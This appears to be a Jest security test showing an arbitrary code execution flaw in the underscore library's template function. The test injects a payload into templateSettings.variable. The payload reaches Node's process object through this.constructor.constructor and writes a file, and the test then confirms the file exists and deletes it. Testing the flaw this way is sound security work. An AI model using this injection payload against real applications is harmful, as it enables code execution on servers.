const v21 = () => {
    const v12 = expect.assertions(2);
    v12;
    const fs = require('fs');
    const _ = require('underscore');
    const path = './underscore';
    file_exist = fs.existsSync(path);
    const v13 = expect(file_exist);
    const v14 = v13.toBe(false);
    v14;
    const v15 = _.templateSettings;
    v15.variable = 'a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)';
    const v16 = _.template('');
    const t = v16();
    file_exist = fs.existsSync(path);
    const v17 = expect(file_exist);
    const v18 = v17.toBe(true);
    v18;
    const v19 = function (err) {
    };
    const v20 = fs.unlink(path, v19);
    v20;
};
const v22 = test('Arbitrary code execution in underscore', v21);
v22;